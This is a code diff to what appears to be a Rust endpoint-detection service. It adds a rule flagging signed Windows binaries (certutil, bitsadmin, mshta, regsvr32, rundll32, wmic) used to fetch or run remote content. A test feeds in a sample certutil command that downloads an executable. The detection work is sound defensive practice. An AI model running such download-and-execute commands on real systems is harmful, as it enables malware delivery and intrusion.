@@ -240,6 +240,27 @@ impl Staging {
                         }
                     }
                 }
+                // Living off the land: a signed Windows binary used to fetch
+                // or run something it was not shipped to run. Each pattern names
+                // the *use*, not the binary, because `certutil -dump` and
+                // `bitsadmin /list` are ordinary administration.
+                if let Some(command_line) = record.command_line.as_deref() {
+                    let lower = command_line.to_ascii_lowercase();
+                    let downloads = (lower.contains("certutil") && lower.contains("-urlcache"))
+                        || (lower.contains("bitsadmin") && lower.contains("/transfer"))
+                        || (lower.contains("mshta") && lower.contains("http"))
+                        || (lower.contains("regsvr32") && lower.contains("/i:http"))
+                        || (lower.contains("rundll32") && lower.contains("javascript:"))
+                        || (lower.contains("wmic") && lower.contains("process call create"));
+                    if downloads {
+                        hits.push(Hit {
+                            id: "behaviour/lolbin-download",
+                            score: 110,
+                            path: record.path.clone().unwrap_or_default(),
+                            description: "A signed system binary was used to fetch or run remote content.".to_string(),
+                        });
+                    }
+                }
                 // The document-to-script chain. `class_of` for the parent is
                 // what the service learned when it saw that parent start; a
                 // parent it never saw is class 8 and cannot be Office.
@@ -583,6 +604,32 @@ mod tests {
             hits.iter().any(|hit| hit.id == "behaviour/ransomware-shape"),
             "{hits:?}"
         );
+    }
+
+    #[test]
+    fn a_lolbin_fetch_is_a_hit_and_a_plain_one_is_not() {
+        let mut staging = Staging::new();
+        let mut fetch = event(
+            Action::ProcessStarted,
+            11,
+            10,
+            r"C:\Windows\System32\certutil.exe",
+            1_000,
+        );
+        fetch.command_line = Some(r"certutil -urlcache -f http://127.0.0.1/a.exe a.exe".to_string());
+        let hits = staging.observe(&fetch, |_| None);
+        assert_eq!(hits.len(), 1, "{hits:?}");
+        assert_eq!(hits[0].id, "behaviour/lolbin-download");
+
+        let mut plain = event(
+            Action::ProcessStarted,
+            12,
+            10,
+            r"C:\Windows\System32\certutil.exe",
+            2_000,
+        );
+        plain.command_line = Some(r"certutil -dump C:\Windows\Temp\a.cer".to_string());
+        assert!(staging.observe(&plain, |_| None).is_empty());
     }
 
     #[test]
